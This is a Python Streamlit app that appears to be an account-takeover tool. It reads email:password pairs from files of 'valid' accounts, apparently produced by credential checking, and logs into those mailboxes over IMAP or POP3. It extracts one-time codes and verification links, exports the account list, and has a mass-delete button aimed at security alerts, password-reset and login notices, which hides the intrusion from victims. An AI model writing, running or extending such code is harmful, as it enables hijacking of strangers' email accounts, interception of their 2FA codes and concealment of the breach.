import glob
import imaplib
import poplib
import os
import re
from email import message_from_bytes, message_from_string
from email.header import decode_header
import streamlit as st

from hosts import host_list

# Responsive Configuration & Session Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Universal Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Session State Initialization
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "mb_proto" not in st.session_state:
    st.session_state.mb_proto = "IMAP"


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]


def load_valid():
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email, pwd = line.split(":", 1)
                    combo = f"{email.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows


def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


def get_webmail_portal(email):
    if "@" not in email:
        return "https://mail.google.com"
    domain = email.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


# Universal Legitimate Folder Discovery Engine
def list_folders_imap(mail):
    found = set()
    try:
        # Request full list of mailboxes
        for pattern in ('"" "*"', '"" "%"'):
            typ, data = mail.list(pattern)
            if typ == "OK" and data:
                for item in data:
                    if not item:
                        continue
                    s = item.decode("utf-8", errors="ignore") if isinstance(item, bytes) else str(item)
                    
                    # Ignore non-selectable structural nodes
                    if "\\noselect" in s.lower() or "\\nonexistent" in s.lower():
                        continue

                    # Parse folder name taking quotes and delimiters into account
                    match = re.search(r'\((?P<flags>[^\)]*)\)\s+"(?P<delim>[^"]+)"\s+(?P<name>.*)', s)
                    if match:
                        name = match.group("name").strip()
                    else:
                        match_simple = re.search(r'\((?P<flags>[^\)]*)\)\s+(?P<delim>\S+)\s+(?P<name>.*)', s)
                        name = match_simple.group("name").strip() if match_simple else s.split()[-1]

                    if name.startswith('"') and name.endswith('"'):
                        name = name[1:-1]
                    name = name.replace('\\"', '"').strip()

                    if name and name not in (".", "/", '""'):
                        found.add(name)
    except Exception as e:
        log(f"Folder discovery warning: {e}")

    if not found:
        found.add("INBOX")

    return sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, x.lower()))


def open_mail_connection(email, password, host, protocol="IMAP", port=None):
    if protocol.upper() == "POP3":
        p = port or 995
        client = poplib.POP3_SSL(host, p, timeout=20)
        client.user(email)
        client.pass_(password)
        return client
    else:
        p = port or 993
        client = imaplib.IMAP4_SSL(host, p, timeout=20)
        client.login(email, password)
        return client


def close_mail_connection(client, protocol="IMAP"):
    try:
        if protocol.upper() == "POP3":
            client.quit()
        else:
            client.logout()
    except Exception:
        try:
            if hasattr(client, 'shutdown'):
                client.shutdown()
            elif hasattr(client, 'close'):
                client.close()
        except Exception:
            pass


def is_bot_message(subject, body):
    bot_keywords = [
        "otp", "verification", "verify", "security alert", "password reset",
        "code", "confirm", "login", "auth", "signin", "crypto", "token", "activation"
    ]
    combined = f"{subject} {body}".lower()
    return any(kw in combined for kw in bot_keywords)


def extract_pins_and_links(text):
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


def clean_boilerplate(text):
    if not text:
        return ""
    patterns_to_remove = [
        r"(?i)unsubscribe.*?(?:\n|$)",
        r"(?i)privacy policy.*?(?:\n|$)",
        r"(?i)confidentiality notice.*?(?:\n\n|$)",
        r"(?i)this email was sent by.*?(?:\n|$)"
    ]
    cleaned = text
    for pat in patterns_to_remove:
        cleaned = re.sub(pat, "", cleaned)
    return cleaned.strip()


# UI Title Block
st.title("📥 Universal Mailbox Reader & Portal Hub")
st.caption("Supports IMAP, POP3, Custom Domains, Webmail & Private Servers with Real Folder Discovery.")

valid = load_valid()

# Sidebar Setup
st.sidebar.header("Connection Hub")
pick = st.sidebar.selectbox("Valid account", valid or ["none"])
custom_email = st.sidebar.text_input("Email override")
custom_pass = st.sidebar.text_input("Password override", type="password")
protocol_choice = st.sidebar.radio("Protocol", ["IMAP", "POP3"], index=0)
override_host = st.sidebar.text_input("Mail host override (e.g. imap.domain.com)")
override_port = st.sidebar.number_input("Custom Port (0 = Default)", min_value=0, max_value=65535, value=0)

if custom_email.strip():
    email, password = custom_email.strip(), custom_pass.strip()
elif ":" in pick:
    email, password = pick.split(":", 1)
else:
    email, password = "", ""

st.sidebar.write("**Suggested hosts:** " + ", ".join(host_list(email)[:4]) if email else "-")

# Dynamic Credentials Display
if email and password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail & Credentials")
    portal_url = get_webmail_portal(email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials (email:password)", value=f"{email}:{password}", key=f"cred_{email}")

if st.sidebar.button("Connect & Discover Folders", type="primary"):
    if not email or not password:
        st.error("Email and password required")
    else:
        hosts = [override_host.strip()] if override_host.strip() else host_list(email)
        port_val = override_port if override_port > 0 else None
        last_err = "No connection attempted"
        connected_host = ""
        folders = ["INBOX"]
        success = False

        with st.spinner(f"Connecting via {protocol_choice}..."):
            for host in hosts:
                client = None
                try:
                    client = open_mail_connection(email, password, host, protocol=protocol_choice, port=port_val)
                    if protocol_choice == "IMAP":
                        folders = list_folders_imap(client)
                    else:
                        folders = ["INBOX"] # POP3 standard only exposes single inbox stream
                    
                    close_mail_connection(client, protocol=protocol_choice)
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last_err = f"{host}: {e}"
                    if client:
                        close_mail_connection(client, protocol=protocol_choice)

        if success:
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            st.session_state.mb_proto = protocol_choice
            log(f"Connected to {connected_host} [{protocol_choice}] - Found {len(folders)} real folders")
            st.sidebar.success(f"Connected to {connected_host} ({len(folders)} folders)")
        else:
            st.sidebar.error(last_err)
            log(last_err)

# Live Activity Log & Clean Account Downloader
st.sidebar.markdown("---")
st.sidebar.subheader("📜 Live Action Log")
with st.sidebar.expander("View Activity Log", expanded=False):
    for line in st.session_state.mb_log:
        st.text(line)

if valid:
    st.sidebar.markdown("---")
    st.sidebar.subheader("💾 Clean Accounts Export")
    valid_text = "\n".join(valid)
    st.sidebar.download_button(
        label="Download ONLY Valid Accounts",
        data=valid_text,
        file_name="valid_accounts_only.txt",
        mime="text/plain"
    )

# Main Controls
col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 50, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

with st.expander("🔍 Keyword Search & Filtering Options", expanded=False):
    search_query = st.text_input("Search term or keyword")
    search_scope = st.selectbox("Search Scope (IMAP Only)", ["TEXT", "SUBJECT", "FROM", "BODY"])

if st.button("Load & Search Messages", type="primary"):
    proto = st.session_state.mb_proto
    host = override_host.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    port_val = override_port if override_port > 0 else None

    if not email or not password or not host:
        st.error("Please connect first or set valid credentials.")
    else:
        client = None
        try:
            with st.spinner(f"Reading '{folder}' on {host} via {proto}..."):
                client = open_mail_connection(email, password, host, protocol=proto, port=port_val)
                messages_data = []

                if proto == "IMAP":
                    client.select(f'"{folder}"', readonly=False)
                    if search_query.strip():
                        typ, data = client.search(None, search_scope, f'"{search_query.strip()}"')
                    else:
                        typ, data = client.search(None, "ALL")

                    ids = (data[0] or b"").split() if typ == "OK" else []
                    if sort_order == "Newest First":
                        ids = list(reversed(ids))

                    ids = ids[:page_size]

                    for mid in ids:
                        typ, msgdata = client.fetch(mid, "(FLAGS BODY.PEEK[])")
                        if not msgdata or not isinstance(msgdata[0], tuple):
                            continue

                        raw_msg_bytes = msgdata[0][1]
                        msg = message_from_bytes(raw_msg_bytes)

                        subject = decode_hdr(msg.get("Subject", ""))
                        frm = decode_hdr(msg.get("From", ""))
                        date_val = decode_hdr(msg.get("Date", ""))
                        flags_str = str(msgdata[0][0])
                        is_read = "\\Seen" in flags_str

                        body_text = ""
                        if msg.is_multipart():
                            for part in msg.walk():
                                if part.get_content_type() == "text/plain":
                                    try:
                                        body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                        break
                                    except Exception:
                                        pass
                        else:
                            try:
                                body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                            except Exception:
                                pass

                        cleaned_body = clean_boilerplate(body_text)
                        pins, links = extract_pins_and_links(body_text)
                        is_bot = is_bot_message(subject, body_text)

                        messages_data.append({
                            "id": mid.decode(),
                            "from": frm,
                            "subject": subject,
                            "date": date_val,
                            "is_read": is_read,
                            "is_bot": is_bot,
                            "body": cleaned_body,
                            "pins": pins,
                            "links": links,
                            "raw": raw_msg_bytes
                        })
                else: # POP3
                    num_msgs = len(client.list()[1])
                    msg_indices = list(range(1, num_msgs + 1))
                    if sort_order == "Newest First":
                        msg_indices = list(reversed(msg_indices))

                    msg_indices = msg_indices[:page_size]

                    for idx in msg_indices:
                        raw_lines = client.retr(idx)[1]
                        raw_msg_bytes = b"\n".join(raw_lines)
                        msg = message_from_bytes(raw_msg_bytes)

                        subject = decode_hdr(msg.get("Subject", ""))
                        frm = decode_hdr(msg.get("From", ""))
                        date_val = decode_hdr(msg.get("Date", ""))

                        body_text = ""
                        if msg.is_multipart():
                            for part in msg.walk():
                                if part.get_content_type() == "text/plain":
                                    try:
                                        body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                        break
                                    except Exception:
                                        pass
                        else:
                            try:
                                body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                            except Exception:
                                pass

                        if search_query.strip():
                            if search_query.lower() not in f"{subject} {frm} {body_text}".lower():
                                continue

                        cleaned_body = clean_boilerplate(body_text)
                        pins, links = extract_pins_and_links(body_text)
                        is_bot = is_bot_message(subject, body_text)

                        messages_data.append({
                            "id": str(idx),
                            "from": frm,
                            "subject": subject,
                            "date": date_val,
                            "is_read": True,
                            "is_bot": is_bot,
                            "body": cleaned_body,
                            "pins": pins,
                            "links": links,
                            "raw": raw_msg_bytes
                        })

                st.session_state.current_messages = messages_data
                log(f"Loaded {len(messages_data)} messages from {folder} via {proto}")
        except Exception as e:
            st.error(str(e))
            log(str(e))
        finally:
            if client:
                close_mail_connection(client, protocol=proto)

# Message Stream Display & Interactivity
if "current_messages" in st.session_state and st.session_state.current_messages:
    bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    proto = st.session_state.mb_proto

    if bot_msgs:
        st.markdown("---")
        st.subheader(f"🤖 Bot & Security Intelligence ({len(bot_msgs)} detected)")
        if st.button("🗑️ Mass Delete All Bot/Spam Messages"):
            host = override_host.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            port_val = override_port if override_port > 0 else None
            client = None
            try:
                client = open_mail_connection(email, password, host, protocol=proto, port=port_val)
                if proto == "IMAP":
                    client.select(f'"{folder}"', readonly=False)
                    for bm in bot_msgs:
                        client.store(bm["id"], '+FLAGS', '\\Deleted')
                    client.expunge()
                else:
                    for bm in bot_msgs:
                        client.dele(int(bm["id"]))

                st.success(f"Deleted {len(bot_msgs)} bot messages!")
                log(f"Mass deleted {len(bot_msgs)} bot messages from {folder}")
                st.rerun()
            except Exception as e:
                st.error(f"Error deleting bot messages: {e}")
            finally:
                if client:
                    close_mail_connection(client, protocol=proto)

    st.markdown("---")
    st.subheader(f"✉️ Message Stream ({len(st.session_state.current_messages)} loaded)")

    for idx, msg in enumerate(st.session_state.current_messages):
        status_icon = "📖" if msg["is_read"] else "📩"
        bot_badge = " [🤖 BOT/OTP]" if msg["is_bot"] else ""

        with st.expander(f"{status_icon} [{msg['date']}] {msg['from']} - {msg['subject']}{bot_badge}"):
            st.write(f"**From:** {msg['from']}")
            st.write(f"**Subject:** {msg['subject']}")
            st.write(f"**Date:** {msg['date']}")

            if msg["pins"]:
                st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
            if msg["links"]:
                st.markdown("🔗 **Actionable Verification Links:**")
                for link in msg["links"]:
                    st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

            st.markdown("---")
            st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['id']}_{idx}")

            op_col1, op_col2, op_col3, op_col4 = st.columns(4)
            host = override_host.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            port_val = override_port if override_port > 0 else None

            with op_col1:
                if proto == "IMAP" and not msg["is_read"]:
                    if st.button("Mark Read", key=f"read_{msg['id']}_{idx}"):
                        try:
                            cli = open_mail_connection(email, password, host, protocol="IMAP", port=port_val)
                            cli.select(f'"{folder}"', readonly=False)
                            cli.store(msg["id"], '+FLAGS', '\\Seen')
                            close_mail_connection(cli, protocol="IMAP")
                            st.success("Marked as read!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

            with op_col2:
                if proto == "IMAP":
                    target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['id']}_{idx}")
                    if st.button("Move", key=f"mv_btn_{msg['id']}_{idx}"):
                        try:
                            cli = open_mail_connection(email, password, host, protocol="IMAP", port=port_val)
                            cli.select(f'"{folder}"', readonly=False)
                            cli.copy(msg["id"], f'"{target_move}"')
                            cli.store(msg["id"], '+FLAGS', '\\Deleted')
                            cli.expunge()
                            close_mail_connection(cli, protocol="IMAP")
                            st.success(f"Moved to {target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

            with op_col3:
                if st.button("Delete Message", key=f"del_{msg['id']}_{idx}"):
                    try:
                        cli = open_mail_connection(email, password, host, protocol=proto, port=port_val)
                        if proto == "IMAP":
                            cli.select(f'"{folder}"', readonly=False)
                            cli.store(msg["id"], '+FLAGS', '\\Deleted')
                            cli.expunge()
                        else:
                            cli.dele(int(msg["id"]))
                        close_mail_connection(cli, protocol=proto)
                        st.success("Deleted message!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col4:
                with st.popover("View Raw RFC822"):
                    st.code(msg["raw"].decode("utf-8", errors="ignore"))
